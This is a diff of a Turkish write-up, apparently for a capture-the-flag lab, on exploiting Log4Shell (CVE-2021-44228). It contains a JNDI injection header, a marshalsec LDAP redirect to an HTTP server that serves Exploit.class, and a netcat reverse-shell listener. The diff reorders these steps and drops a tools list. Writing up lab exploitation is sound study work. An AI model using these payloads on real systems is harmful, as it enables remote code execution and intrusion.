@@ -52,12 +52,6 @@ public class Exploit {
 }
 ```
 
-Sınıf, derlendikten sonra şu klasörde barındırıldı:
-
-```bash
-javac Exploit.java
-```
-
 #### 4. HTTP Sunucusu Kurulumu
 
 Exploit.class dosyasını sunmak için Python HTTP sunucusu kuruldu:
@@ -69,14 +63,20 @@ Exploit.class dosyasını sunmak için Python HTTP sunucusu kuruldu:
 #### 5. LDAP Sunucusu Kurulumu (Marshalsec)
 
 ```bash
-cd ~/ctf/marshalsec/target
-(base) burak@burak-ABRA-A7-V11-4:~/ctf/marshalsec/target$
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.245.59:8888/#Exploit"
 ```
 
 LDAP sunucusu, hedef sistem tarafından istek geldiğinde, HTTP sunucusundan `Exploit.class` dosyasını indirip çalıştıracak şekilde ayarlandı.
 
-#### 6. Postman ile Payload Gönderimi
+#### 6. Reverse Shell Dinleme
+
+Netcat ile 4444 portunda dinleme başlatıldı:
+
+```bash
+(base) burak@burak-ABRA-A7-V11-4:~$ nc -lvp 4444
+```
+
+#### 7. Postman ile Payload Gönderimi
 
 Postman üzerinden HTTP isteği atıldı:
 
@@ -88,28 +88,8 @@ X-Api-Version: ${jndi:ldap://192.168.245.59:1389/Exploit}
 
 Bu istek, hedef sistemin LDAP sunucusuna bağlanmasını sağladı.
 
-#### 7. Reverse Shell Dinleme
-
-Netcat ile 4444 portunda dinleme başlatıldı:
-
-```bash
-(base) burak@burak-ABRA-A7-V11-4:~$ nc -lvp 4444
-```
-
 Hedef sistemden gelen bağlantı başarıyla alındı ve shell erişimi elde edildi. Komut çalıştırma ve sistem kontrolü sağlandı.
 
----
-
-###  Kullanılan Araçlar ve Komutlar
-
-- `ffuf`: Endpoint fuzzing
-- `marshalsec`: LDAP sunucu kurulum aracı
-- `python3 -m http.server`: Exploit.class dosyasını paylaşmak
-- `javac`: Java exploit derlemesi
-- `netcat (nc)`: Reverse shell dinleyici
-- `Postman`: HTTP isteklerini manuel tetikleme
-
----
 
 ###  Sonuç
 Bu adımlar sonucunda hedef sistemde bulunan Log4Shell (CVE-2021-44228) zafiyetinden faydalanılarak tam yetkili reverse shell erişimi sağlanmıştır. Log4j kütüphanesinin zafiyetli sürümü, LDAP ve HTTP sunucularla birlikte kullanılarak sistemin dışarıdan kod çalıştırması sağlanmıştır.
